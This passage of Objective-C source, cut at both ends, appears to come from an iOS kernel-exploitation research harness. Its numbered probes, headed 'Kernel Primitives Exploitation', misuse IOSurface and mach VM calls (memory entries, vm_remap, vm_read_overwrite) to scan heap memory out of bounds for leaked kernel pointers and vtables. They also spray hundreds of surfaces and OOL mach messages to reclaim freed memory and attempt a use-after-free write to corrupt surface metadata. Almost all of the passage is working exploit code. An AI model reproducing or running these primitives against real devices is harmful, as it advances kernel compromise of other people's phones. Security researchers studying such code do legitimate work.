            uint8_t procBuf[1024];
            memset(procBuf, 0, sizeof(procBuf));
            int ret = proc_pidinfo(getpid(), 2, 0, procBuf, sizeof(procBuf)); // PROC_PIDTASKINFO=2
            if (ret > 0) {
                log([NSString stringWithFormat:@"SYSCALL: proc_pidinfo returned %d bytes", ret]);
                for (int i = 0; i < ret && i < 1024; i += 8) {
                    uint64_t val = 0;
                    memcpy(&val, procBuf + i, 8);
                    if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
                        kernelPtrs++;
                        anomalies++;
                        log([NSString stringWithFormat:@"SYSCALL: KPTR in procinfo +%d: 0x%llx", i, val]);
                    }
                }
            }
        }

        // Steps 3-5: mach_make_memory_entry + map + destroy
        vm_address_t mapped_addr = 0;
        vm_size_t mapped_size = 0;
        mach_port_t mem_entry = MACH_PORT_NULL;

        if (!isr_stopped()) {
            log(@"SYSCALL: Step 3 — mach_make_memory_entry_64 from IOSurface");
            NSDictionary *props = @{
                @"IOSurfaceWidth": @64,
                @"IOSurfaceHeight": @64,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfacePixelFormat": @0x42475241
            };
            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)props);
            if (surf) {
                size_t allocSize = sym.getAllocSize(surf);
                sym.lock(surf, 0, NULL);
                void *base = sym.getBase(surf);

                if (base) {
                    uint32_t sentinel = 0xFACEFEED;
                    memcpy(base, &sentinel, 4);

                    memory_object_size_t entry_size = allocSize;
                    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(),
                        &entry_size, (vm_address_t)base,
                        VM_PROT_READ | VM_PROT_WRITE | 0x400000, // MAP_MEM_VM_SHARE
                        &mem_entry, MACH_PORT_NULL);

                    if (kr == KERN_SUCCESS && mem_entry != MACH_PORT_NULL) {
                        memEntryCreated = 1;
                        log([NSString stringWithFormat:@"SYSCALL: Memory entry created! port=%d size=%llu",
                             mem_entry, (uint64_t)entry_size]);
                        anomalies++;

                        // Step 4: vm_map the memory entry
                        mapped_size = entry_size;
                        kr = vm_map(mach_task_self(), &mapped_addr, mapped_size, 0,
                            VM_FLAGS_ANYWHERE, mem_entry, 0, FALSE,
                            VM_PROT_READ | VM_PROT_WRITE,
                            VM_PROT_READ | VM_PROT_WRITE,
                            VM_INHERIT_NONE);

                        if (kr == KERN_SUCCESS) {
                            sharedMapping = 1;
                            log([NSString stringWithFormat:@"SYSCALL: SHARED MAP at 0x%llx — checking sentinel", (uint64_t)mapped_addr]);
                            uint32_t check = 0;
                            memcpy(&check, (void *)mapped_addr, 4);
                            if (check == 0xFACEFEED) {
                                log(@"SYSCALL: SENTINEL CONFIRMED — shared memory works!");
                                anomalies++;
                            }
                        } else {
                            log([NSString stringWithFormat:@"SYSCALL: vm_map failed kr=%d", kr]);
                        }
                    } else {
                        log([NSString stringWithFormat:@"SYSCALL: memory_entry failed kr=%d", kr]);
                    }
                }
                sym.unlock(surf, 0, NULL);

                // Step 5: Destroy surface, read mapped region
                if (!isr_stopped() && sharedMapping) {
                    log(@"SYSCALL: Step 5 — Destroying surface, reading shared map");
                    CFRelease(surf);
                    surf = NULL;

                    vm_size_t readSize = 0;
                    uint8_t readBuf[256];
                    memset(readBuf, 0, sizeof(readBuf));
                    kern_return_t kr2 = vm_read_overwrite(mach_task_self(),
                        mapped_addr, 256,
                        (vm_address_t)readBuf, &readSize);
                    if (kr2 == KERN_SUCCESS && readSize > 0) {
                        uint32_t f4 = 0;
                        memcpy(&f4, readBuf, 4);
                        if (f4 != 0xFACEFEED && f4 != 0) {
                            postDestroyLeak++;
                            anomalies++;
                            log([NSString stringWithFormat:@"SYSCALL: POST-DESTROY LEAK! first4=0x%08x", f4]);
                        }
                        for (size_t i = 0; i < readSize; i += 8) {
                            uint64_t val = 0;
                            memcpy(&val, readBuf + i, 8);
                            if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
                                kernelPtrs++;
                                anomalies++;
                                log([NSString stringWithFormat:@"SYSCALL: POST-DESTROY KPTR +%zu: 0x%llx", i, val]);
                            }
                        }
                    }
                }
                if (surf) CFRelease(surf);
            }
        }

        // Step 6: vm_region_recurse_64
        if (!isr_stopped()) {
            log(@"SYSCALL: Step 6 — VM region enumeration");
            vm_address_t addr = 0;
            int suspiciousRegions = 0;
            int regionCount = 0;
            while (!isr_stopped() && regionCount < 500) {
                vm_size_t size = 0;
                uint32_t depth = 0;
                struct vm_region_submap_info_64 info;
                mach_msg_type_number_t infoCnt = VM_REGION_SUBMAP_INFO_COUNT_64;
                kern_return_t kr = vm_region_recurse_64(mach_task_self(),
                    &addr, &size, &depth,
                    (vm_region_recurse_info_t)&info, &infoCnt);
                if (kr != KERN_SUCCESS) break;

                if (info.share_mode == 3 && size >= 0x100000) { // SM_SHARED_ALIASED
                    suspiciousRegions++;
                    if (suspiciousRegions <= 3) {
                        log([NSString stringWithFormat:@"SYSCALL: Shared aliased region 0x%llx size=0x%llx prot=%d",
                             (uint64_t)addr, (uint64_t)size, info.protection]);
                    }
                }
                addr += size;
                regionCount++;
            }
            log([NSString stringWithFormat:@"SYSCALL: Enumerated %d regions, %d suspicious shared", regionCount, suspiciousRegions]);
        }

        // Step 7: host_statistics
        if (!isr_stopped()) {
            log(@"SYSCALL: Step 7 — host_statistics");
            vm_statistics64_data_t vmstat;
            mach_msg_type_number_t hcount = HOST_VM_INFO64_COUNT;
            kern_return_t kr = host_statistics64(mach_host_self(), HOST_VM_INFO64,
                (host_info64_t)&vmstat, &hcount);
            if (kr == KERN_SUCCESS) {
                log([NSString stringWithFormat:@"SYSCALL: free=%llu active=%llu wire=%llu purge=%llu",
                     (uint64_t)vmstat.free_count, (uint64_t)vmstat.active_count,
                     (uint64_t)vmstat.wire_count, (uint64_t)vmstat.purgeable_count]);
            }
        }

        // Step 9: OOB reads via vm_read_overwrite
        if (!isr_stopped()) {
            log(@"SYSCALL: Step 9 — OOB vm_read from IOSurface base");
            NSDictionary *props2 = @{
                @"IOSurfaceWidth": @64,
                @"IOSurfaceHeight": @64,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfacePixelFormat": @0x42475241
            };
            IOSurfaceRef oobSurf = sym.create((__bridge CFDictionaryRef)props2);
            if (oobSurf) {
                sym.lock(oobSurf, 1, NULL);
                void *oobBase = sym.getBase(oobSurf);
                if (oobBase) {
                    size_t offsets[] = {0x100000, 0x200000, 0x400000, 0x800000};
                    for (int i = 0; i < 4 && !isr_stopped(); i++) {
                        uint8_t buf[64];
                        vm_size_t readSize = 0;
                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
                            (vm_address_t)oobBase + offsets[i], 64,
                            (vm_address_t)buf, &readSize);
                        if (kr == KERN_SUCCESS && readSize > 0) {
                            oobReads++;
                            BOOL nonZero = NO;
                            for (size_t j = 0; j < readSize; j++) {
                                if (buf[j] != 0) { nonZero = YES; break; }
                            }
                            if (nonZero) {
                                anomalies++;
                                uint64_t first8 = 0;
                                memcpy(&first8, buf, 8);
                                log([NSString stringWithFormat:@"SYSCALL: OOB READ +0x%zx SUCCESS data=0x%llx", offsets[i], first8]);
                                for (size_t j = 0; j < readSize; j += 8) {
                                    uint64_t val = 0;
                                    memcpy(&val, buf + j, 8);
                                    if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
                                        kernelPtrs++;
                                        log([NSString stringWithFormat:@"SYSCALL: OOB KPTR +0x%zx+%zu: 0x%llx", offsets[i], j, val]);
                                    }
                                }
                            }
                        }
                    }
                }
                sym.unlock(oobSurf, 1, NULL);
                CFRelease(oobSurf);
            }
        }

        // Cleanup
        if (mapped_addr) vm_deallocate(mach_task_self(), mapped_addr, mapped_size);
        if (mem_entry != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), mem_entry);

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
        log([NSString stringWithFormat:@"SYSCALL: Completed in %.2fs", elapsed]);
        log([NSString stringWithFormat:@"SYSCALL: dyld=0x%llx memEntry=%d shared=%d postLeak=%d kptrs=%d oob=%d anomalies=%d",
             dyldBase, memEntryCreated, sharedMapping, postDestroyLeak, kernelPtrs, oobReads, anomalies]);

        NSString *verdict;
        if (kernelPtrs > 0) verdict = @"CRITICAL — kernel pointer leak detected!";
        else if (postDestroyLeak > 0) verdict = @"HIGH — post-destroy data leak via shared mapping";
        else if (sharedMapping) verdict = @"HIGH — mach_make_memory_entry shared mapping works";
        else if (memEntryCreated) verdict = @"MEDIUM — memory entry created from IOSurface";
        else if (oobReads > 0) verdict = @"MEDIUM — OOB vm_read returned data";
        else verdict = @"LOW — no kernel leaks detected";
        log([NSString stringWithFormat:@"SYSCALL: VERDICT: %@", verdict]);

        NSDictionary *res = @{
            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
            @"anomalies": @(anomalies),
            @"verdict": verdict,
            @"elapsed": @(elapsed),
            @"dyldBase": @(dyldBase),
            @"memEntryCreated": @(memEntryCreated),
            @"sharedMapping": @(sharedMapping),
            @"postDestroyLeak": @(postDestroyLeak),
            @"kernelPtrs": @(kernelPtrs),
            @"oobReads": @(oobReads)
        };
        isr_checkpoint(@"ISR-SyscallStorm-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

#pragma mark - Round 27: Kernel Primitives Exploitation

// Probe 82: OOB Heap Scanner
void iosurface_research_oob_scanner(ISRLogBlock log, ISRDoneBlock done) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ISRSymbols sym;
        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }

        log(@"OOBSCAN: === Probe 82: OOB Heap Scanner ===");
        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];

        int anomalies = 0;
        int totalReads = 0;
        int successReads = 0;
        int kernelPtrs = 0;
        int vtableCandidates = 0;
        int nonZeroRegions = 0;
        uint64_t maxKptr = 0;
        uint64_t minKptr = UINT64_MAX;
        int iosfMetadata = 0;

        NSDictionary *props = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @0x42475241
        };

        // Create multiple surfaces to populate the heap region
        IOSurfaceRef scanSurfs[8];
        memset(scanSurfs, 0, sizeof(scanSurfs));
        for (int i = 0; i < 8; i++) {
            scanSurfs[i] = sym.create((__bridge CFDictionaryRef)props);
        }

        IOSurfaceRef mainSurf = sym.create((__bridge CFDictionaryRef)props);
        if (!mainSurf) {
            log(@"OOBSCAN: Failed to create main surface");
            for (int i = 0; i < 8; i++) { if (scanSurfs[i]) CFRelease(scanSurfs[i]); }
            isr_unload(&sym);
            done(@{@"status": @"ERROR", @"anomalies": @0});
            return;
        }

        // Create more surfaces after to surround main in heap
        IOSurfaceRef postSurfs[8];
        memset(postSurfs, 0, sizeof(postSurfs));
        for (int i = 0; i < 8; i++) {
            postSurfs[i] = sym.create((__bridge CFDictionaryRef)props);
        }

        size_t allocSize = sym.getAllocSize(mainSurf);
        sym.lock(mainSurf, 0, NULL);
        void *base = sym.getBase(mainSurf);

        if (!base) {
            log(@"OOBSCAN: Failed to get base address");
            sym.unlock(mainSurf, 0, NULL);
            CFRelease(mainSurf);
            for (int i = 0; i < 8; i++) { if (scanSurfs[i]) CFRelease(scanSurfs[i]); if (postSurfs[i]) CFRelease(postSurfs[i]); }
            isr_unload(&sym);
            done(@{@"status": @"ERROR", @"anomalies": @0});
            return;
        }

        // Write sentinel so we know our own surface
        uint32_t sentinel = 0xABCD1234;
        memcpy(base, &sentinel, 4);

        log([NSString stringWithFormat:@"OOBSCAN: base=0x%llx allocSize=%zu", (uint64_t)base, allocSize]);
        log(@"OOBSCAN: Step 1 — Forward scan 0 to +16MB in 4KB steps");

        // Forward scan: read 64 bytes at each offset
        size_t offsets_to_scan = 16 * 1024 * 1024; // 16MB
        size_t step = 4096; // 4KB

        for (size_t off = step; off <= offsets_to_scan && !isr_stopped(); off += step) {
            totalReads++;
            uint8_t buf[64];
            memset(buf, 0, sizeof(buf));
            vm_size_t readSize = 0;
            kern_return_t kr = vm_read_overwrite(mach_task_self(),
                (vm_address_t)base + off, 64,
                (vm_address_t)buf, &readSize);

            if (kr == KERN_SUCCESS && readSize > 0) {
                successReads++;

                // Check if non-zero
                BOOL nonZero = NO;
                for (size_t j = 0; j < readSize; j++) {
                    if (buf[j] != 0) { nonZero = YES; break; }
                }
                if (nonZero) nonZeroRegions++;

                // Scan for kernel pointers and vtable candidates
                for (size_t j = 0; j + 8 <= readSize; j += 8) {
                    uint64_t val = 0;
                    memcpy(&val, buf + j, 8);

                    // Kernel pointer check (0xFFFF prefix, not all-F)
                    if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
                        kernelPtrs++;
                        anomalies++;
                        if (val > maxKptr) maxKptr = val;
                        if (val < minKptr) minKptr = val;
                        if (kernelPtrs <= 20) {
                            log([NSString stringWithFormat:@"OOBSCAN: KPTR +0x%zx+%zu: 0x%llx", off, j, val]);
                        }
                    }

                    // vtable candidate: aligned pointer in __DATA_CONST or __TEXT region
                    if ((val & 0xFFF) == 0 && val > 0x100000000ULL && val < 0xFFFF000000000000ULL) {
                        vtableCandidates++;
                        if (vtableCandidates <= 10) {
                            log([NSString stringWithFormat:@"OOBSCAN: VTABLE? +0x%zx+%zu: 0x%llx", off, j, val]);
                        }
                    }

                    // IOSurface magic / pixel format check (0x42475241 = BGRA)
                    if (val == 0x42475241 || val == 0x4247524142475241ULL) {
                        iosfMetadata++;
                        anomalies++;
                        if (iosfMetadata <= 10) {
                            log([NSString stringWithFormat:@"OOBSCAN: IOSF_META +0x%zx+%zu: 0x%llx", off, j, val]);
                        }
                    }
                }

                // Check for IOSurface ID patterns (sequential small integers)
                uint32_t first4 = 0;
                memcpy(&first4, buf, 4);
                IOSurfaceID myID = sym.getID(mainSurf);
                if (first4 > 0 && first4 < myID + 50 && first4 >= myID - 20) {
                    iosfMetadata++;
                    anomalies++;
                    if (iosfMetadata <= 10) {
                        log([NSString stringWithFormat:@"OOBSCAN: SURF_ID? +0x%zx: id=%u (ours=%u)", off, first4, myID]);
                    }
                }
            }
        }

        log([NSString stringWithFormat:@"OOBSCAN: Forward scan done: %d/%d success, %d non-zero", successReads, totalReads, nonZeroRegions]);

        // Step 2: Backward scan (negative offsets)
        if (!isr_stopped()) {
            log(@"OOBSCAN: Step 2 — Backward scan 0 to -4MB in 4KB steps");
            int backSuccess = 0;
            int backKptrs = 0;
            size_t backMax = 4 * 1024 * 1024;
            for (size_t off = step; off <= backMax && !isr_stopped(); off += step) {
                vm_address_t target = (vm_address_t)base - off;
                if (target < 0x10000) break; // avoid null page
                uint8_t buf[64];
                memset(buf, 0, sizeof(buf));
                vm_size_t readSize = 0;
                kern_return_t kr = vm_read_overwrite(mach_task_self(),
                    target, 64, (vm_address_t)buf, &readSize);
                if (kr == KERN_SUCCESS && readSize > 0) {
                    backSuccess++;
                    for (size_t j = 0; j + 8 <= readSize; j += 8) {
                        uint64_t val = 0;
                        memcpy(&val, buf + j, 8);
                        if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
                            backKptrs++;
                            kernelPtrs++;
                            anomalies++;
                            if (backKptrs <= 10) {
                                log([NSString stringWithFormat:@"OOBSCAN: BACK KPTR -0x%zx+%zu: 0x%llx", off, j, val]);
                            }
                        }
                    }
                }
            }
            log([NSString stringWithFormat:@"OOBSCAN: Backward scan: %d success, %d kptrs", backSuccess, backKptrs]);
        }

        // Step 3: Fine-grained scan around successful offsets
        if (!isr_stopped() && kernelPtrs > 0) {
            log(@"OOBSCAN: Step 3 — Fine scan around kernel pointer offsets");
            size_t hotspots[] = {0x100000, 0x200000, 0x400000, 0x800000, 0xC00000, 0x1000000};
            int fineKptrs = 0;
            for (int h = 0; h < 6 && !isr_stopped(); h++) {
                for (size_t delta = 0; delta < 0x10000 && !isr_stopped(); delta += 256) {
                    size_t off = hotspots[h] + delta;
                    uint8_t buf[256];
                    memset(buf, 0, sizeof(buf));
                    vm_size_t readSize = 0;
                    kern_return_t kr = vm_read_overwrite(mach_task_self(),
                        (vm_address_t)base + off, 256,
                        (vm_address_t)buf, &readSize);
                    if (kr == KERN_SUCCESS && readSize > 0) {
                        for (size_t j = 0; j + 8 <= readSize; j += 8) {
                            uint64_t val = 0;
                            memcpy(&val, buf + j, 8);
                            if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
                                fineKptrs++;
                                if (fineKptrs <= 15) {
                                    log([NSString stringWithFormat:@"OOBSCAN: FINE KPTR +0x%zx+%zu: 0x%llx", off, j, val]);
                                }
                            }
                        }
                    }
                }
            }
            kernelPtrs += fineKptrs;
            anomalies += fineKptrs;
            log([NSString stringWithFormat:@"OOBSCAN: Fine scan found %d additional kptrs", fineKptrs]);
        }

        sym.unlock(mainSurf, 0, NULL);
        CFRelease(mainSurf);
        for (int i = 0; i < 8; i++) { if (scanSurfs[i]) CFRelease(scanSurfs[i]); if (postSurfs[i]) CFRelease(postSurfs[i]); }

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
        log([NSString stringWithFormat:@"OOBSCAN: Completed in %.2fs", elapsed]);

        if (kernelPtrs > 0 && minKptr < UINT64_MAX) {
            log([NSString stringWithFormat:@"OOBSCAN: Kernel ptr range: 0x%llx — 0x%llx (span=0x%llx)",
                 minKptr, maxKptr, maxKptr - minKptr]);
        }
        log([NSString stringWithFormat:@"OOBSCAN: reads=%d/%d kptrs=%d vtables=%d iosfMeta=%d anomalies=%d",
             successReads, totalReads, kernelPtrs, vtableCandidates, iosfMetadata, anomalies]);

        NSString *verdict;
        if (kernelPtrs > 10) verdict = @"CRITICAL — massive kernel pointer leak across heap!";
        else if (kernelPtrs > 0) verdict = @"HIGH — kernel pointers found in adjacent heap regions";
        else if (iosfMetadata > 0) verdict = @"HIGH — IOSurface metadata readable via OOB";
        else if (vtableCandidates > 0) verdict = @"MEDIUM — vtable candidates in OOB region";
        else if (successReads > 100) verdict = @"MEDIUM — large readable OOB region";
        else verdict = @"LOW — limited OOB reach";
        log([NSString stringWithFormat:@"OOBSCAN: VERDICT: %@", verdict]);

        NSDictionary *res = @{
            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
            @"anomalies": @(anomalies),
            @"verdict": verdict,
            @"elapsed": @(elapsed),
            @"totalReads": @(totalReads),
            @"successReads": @(successReads),
            @"kernelPtrs": @(kernelPtrs),
            @"vtableCandidates": @(vtableCandidates),
            @"iosfMetadata": @(iosfMetadata)
        };
        isr_checkpoint(@"ISR-OOBScanner-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

// Probe 83: Remap Spray Oracle
void iosurface_research_remap_spray(ISRLogBlock log, ISRDoneBlock done) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ISRSymbols sym;
        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }

        log(@"REMAPSPRAY: === Probe 83: Remap Spray Oracle ===");
        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];

        int anomalies = 0;
        int remapOk = 0;
        int sentinelConfirmed = 0;
        int metadataInRemap = 0;
        int kptrsInRemap = 0;
        int surfIDsFound = 0;
        int writeCorrupt = 0;
        int uafConfirmed = 0;

        vm_address_t remap_addr = 0;
        size_t allocSize = 0;

        NSDictionary *props = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @0x42475241
        };

        // Step 1: Create victim surface and remap its pages
        IOSurfaceRef victim = sym.create((__bridge CFDictionaryRef)props);
        if (!victim) {
            log(@"REMAPSPRAY: Failed to create victim surface");
            isr_unload(&sym);
            done(@{@"status": @"ERROR", @"anomalies": @0});
            return;
        }

        allocSize = sym.getAllocSize(victim);
        IOSurfaceID victimID = sym.getID(victim);
        log([NSString stringWithFormat:@"REMAPSPRAY: Victim ID=%u allocSize=%zu", victimID, allocSize]);

        sym.lock(victim, 0, NULL);
        void *victimBase = sym.getBase(victim);
        if (!victimBase) {
            log(@"REMAPSPRAY: Failed to get victim base");
            sym.unlock(victim, 0, NULL);
            CFRelease(victim);
            isr_unload(&sym);
            done(@{@"status": @"ERROR", @"anomalies": @0});
            return;
        }

        // Write unique sentinel pattern
        uint32_t sentPattern = 0xDEAD8327;
        memset(victimBase, 0, allocSize);
        for (size_t i = 0; i < allocSize; i += 4096) {
            uint32_t marker = sentPattern ^ (uint32_t)(i >> 12);
            memcpy((uint8_t *)victimBase + i, &marker, 4);
        }

        log(@"REMAPSPRAY: Step 1 — vm_remap victim pages");
        vm_prot_t cur_prot = VM_PROT_NONE, max_prot = VM_PROT_NONE;
        kern_return_t kr = vm_remap(mach_task_self(),
            &remap_addr, (vm_size_t)allocSize, 0,
            VM_FLAGS_ANYWHERE,
            mach_task_self(),
            (vm_address_t)victimBase,
            FALSE,
            &cur_prot, &max_prot,
            VM_INHERIT_NONE);

        if (kr != KERN_SUCCESS) {
            log([NSString stringWithFormat:@"REMAPSPRAY: vm_remap failed kr=%d", kr]);
            sym.unlock(victim, 0, NULL);
            CFRelease(victim);
            isr_unload(&sym);
            done(@{@"status": @"ERROR", @"anomalies": @0, @"verdict": @"LOW — vm_remap failed"});
            return;
        }

        remapOk = 1;
        log([NSString stringWithFormat:@"REMAPSPRAY: Remap at 0x%llx prot=%d/%d", (uint64_t)remap_addr, cur_prot, max_prot]);

        // Verify sentinel via remap
        uint32_t check = 0;
        memcpy(&check, (void *)remap_addr, 4);
        if (check == sentPattern) {
            sentinelConfirmed = 1;
            log(@"REMAPSPRAY: Sentinel confirmed — physical pages shared");
        }
        sym.unlock(victim, 0, NULL);

        // Step 2: Destroy victim surface
        if (!isr_stopped()) {
            log(@"REMAPSPRAY: Step 2 — Destroying victim surface");
            CFRelease(victim);
            victim = NULL;

            // Read remap immediately post-destroy
            uint8_t postBuf[256];
            memset(postBuf, 0, sizeof(postBuf));
            vm_size_t readSize = 0;
            kr = vm_read_overwrite(mach_task_self(),
                remap_addr, 256, (vm_address_t)postBuf, &readSize);
            if (kr == KERN_SUCCESS && readSize > 0) {
                uint32_t f4 = 0;
                memcpy(&f4, postBuf, 4);
                log([NSString stringWithFormat:@"REMAPSPRAY: Post-destroy first4=0x%08x", f4]);
            }
        }

        // Step 3: Spray 500 new surfaces of same size
        IOSurfaceRef spraySurfs[500];
        memset(spraySurfs, 0, sizeof(spraySurfs));
        int sprayCount = 0;

        if (!isr_stopped()) {
            log(@"REMAPSPRAY: Step 3 — Spraying 500 IOSurfaces of same size");
            for (int i = 0; i < 500 && !isr_stopped(); i++) {
                IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)props);
                if (s) {
                    // Write unique marker to each spray surface
                    sym.lock(s, 0, NULL);
                    void *sb = sym.getBase(s);
                    if (sb) {
                        uint32_t sprayMark = 0x57524100 | (i & 0xFFFF);
                        memcpy(sb, &sprayMark, 4);
                        IOSurfaceID sid = sym.getID(s);
                        memcpy((uint8_t *)sb + 4, &sid, 4);
                    }
                    sym.unlock(s, 0, NULL);
                    spraySurfs[sprayCount++] = s;
                }
            }
            log([NSString stringWithFormat:@"REMAPSPRAY: Sprayed %d surfaces", sprayCount]);
        }

        // Step 4: Read remapped region — check what replaced the freed memory
        if (!isr_stopped()) {
            log(@"REMAPSPRAY: Step 4 — Reading remap region for new surface metadata");

            for (size_t off = 0; off < allocSize && !isr_stopped(); off += 4096) {
                uint8_t scanBuf[256];
                memset(scanBuf, 0, sizeof(scanBuf));
                vm_size_t readSize = 0;
                kr = vm_read_overwrite(mach_task_self(),
                    remap_addr + off, 256,
                    (vm_address_t)scanBuf, &readSize);
                if (kr != KERN_SUCCESS || readSize == 0) continue;

                uint32_t f4 = 0;
                memcpy(&f4, scanBuf, 4);

                // Check if we see spray markers
                if ((f4 & 0xFFFFFF00) == 0x57524100) {
                    int idx = f4 & 0xFFFF;
                    uint32_t sid = 0;
                    memcpy(&sid, scanBuf + 4, 4);
                    surfIDsFound++;
                    anomalies++;
                    uafConfirmed = 1;
                    if (surfIDsFound <= 10) {
                        log([NSString stringWithFormat:@"REMAPSPRAY: UAF READ! +0x%zx spray[%d] surfID=%u", off, idx, sid]);
                    }
                }

                // Check for kernel pointers
                for (size_t j = 0; j + 8 <= readSize; j += 8) {
                    uint64_t val = 0;
                    memcpy(&val, scanBuf + j, 8);
                    if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
                        kptrsInRemap++;
                        anomalies++;
                        if (kptrsInRemap <= 10) {
                            log([NSString stringWithFormat:@"REMAPSPRAY: KPTR in remap +0x%zx+%zu: 0x%llx", off, j, val]);
                        }
                    }
                }

                // Check for IOSurface pixel format or metadata
                for (size_t j = 0; j + 4 <= readSize; j += 4) {
                    uint32_t v32 = 0;
                    memcpy(&v32, scanBuf + j, 4);
                    if (v32 == 0x42475241) { // BGRA pixel format
                        metadataInRemap++;
                        if (metadataInRemap <= 5) {
                            log([NSString stringWithFormat:@"REMAPSPRAY: IOSF pixfmt at remap +0x%zx+%zu", off, j]);
                        }
                    }
                    // Check for surface IDs in range
                    if (v32 > victimID && v32 <= victimID + 600) {
                        surfIDsFound++;
                        if (surfIDsFound <= 10) {
                            log([NSString stringWithFormat:@"REMAPSPRAY: SURF ID %u at remap +0x%zx+%zu", v32, off, j]);
                        }
                    }
                }
            }
            log([NSString stringWithFormat:@"REMAPSPRAY: Remap scan: kptrs=%d meta=%d surfIDs=%d uaf=%d",
                 kptrsInRemap, metadataInRemap, surfIDsFound, uafConfirmed]);
        }

        // Step 5: Write through remap to try corrupting new surface metadata
        if (!isr_stopped() && uafConfirmed) {
            log(@"REMAPSPRAY: Step 5 — Attempting write through remap (UAF write)");
            uint32_t corruptVal = 0xC0227E27;
            kr = vm_write(mach_task_self(), remap_addr,
                (vm_offset_t)&corruptVal, 4);
            if (kr == KERN_SUCCESS) {
                writeCorrupt = 1;
                anomalies++;
                log(@"REMAPSPRAY: UAF WRITE SUCCEEDED — checking spray surfaces for corruption");

                // Check if any spray surface was corrupted
                for (int i = 0; i < sprayCount && i < 500 && !isr_stopped(); i++) {
                    sym.lock(spraySurfs[i], 1, NULL);
                    void *sb = sym.getBase(spraySurfs[i]);
                    if (sb) {
                        uint32_t readBack = 0;
                        memcpy(&readBack, sb, 4);
                        if (readBack == 0xC0227E27) {
                            anomalies += 5;
                            log([NSString stringWithFormat:@"REMAPSPRAY: CORRUPTION CONFIRMED in spray[%d] ID=%u!",
                                 i, sym.getID(spraySurfs[i])]);
                        }
                    }
                    sym.unlock(spraySurfs[i], 1, NULL);
                }
            } else {
                log([NSString stringWithFormat:@"REMAPSPRAY: Write kr=%d", kr]);
            }
        }

        // Step 6: OOL spray into freed zone via remap
        if (!isr_stopped() && !uafConfirmed) {
            log(@"REMAPSPRAY: Step 6 — OOL mach msg spray into freed zone");
            mach_port_t spray_port;
            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray_port);
            mach_port_insert_right(mach_task_self(), spray_port, spray_port, MACH_MSG_TYPE_MAKE_SEND);

            uint8_t ool_data[16384];
            memset(ool_data, 0x42, sizeof(ool_data));
            uint32_t oolMark = 0x004F4F4C; // "OOL\0"
            memcpy(ool_data, &oolMark, 4);

            for (int i = 0; i < 300 && !isr_stopped(); i++) {
                struct {
                    mach_msg_header_t hdr;
                    mach_msg_body_t body;
                    mach_msg_ool_descriptor_t ool;
                } msg = {0};
                msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
                msg.hdr.msgh_size = sizeof(msg);
                msg.hdr.msgh_remote_port = spray_port;
                msg.hdr.msgh_local_port = MACH_PORT_NULL;
                msg.body.msgh_descriptor_count = 1;
                msg.ool.address = ool_data;
                msg.ool.size = (mach_msg_size_t)allocSize;
                msg.ool.deallocate = FALSE;
                msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
                mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(msg), 0, MACH_PORT_NULL, 10, MACH_PORT_NULL);
            }

            // Check remap for OOL data
            uint8_t oolCheck[64];
            vm_size_t oolRead = 0;
            kr = vm_read_overwrite(mach_task_self(), remap_addr, 64, (vm_address_t)oolCheck, &oolRead);
            if (kr == KERN_SUCCESS && oolRead > 0) {
                uint32_t f4 = 0;
                memcpy(&f4, oolCheck, 4);
                if (f4 == 0x004F4F4C) {
                    anomalies++;
                    log(@"REMAPSPRAY: OOL DATA LANDED IN REMAP! Zone reclaim via mach msg!");
                } else {
                    log([NSString stringWithFormat:@"REMAPSPRAY: Post-OOL first4=0x%08x", f4]);
                }
            }
            mach_port_deallocate(mach_task_self(), spray_port);
        }

        // Cleanup
        if (remap_addr) vm_deallocate(mach_task_self(), remap_addr, (vm_size_t)allocSize);
        for (int i = 0; i < sprayCount; i++) { if (spraySurfs[i]) CFRelease(spraySurfs[i]); }

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
        log([NSString stringWithFormat:@"REMAPSPRAY: Completed in %.2fs", elapsed]);
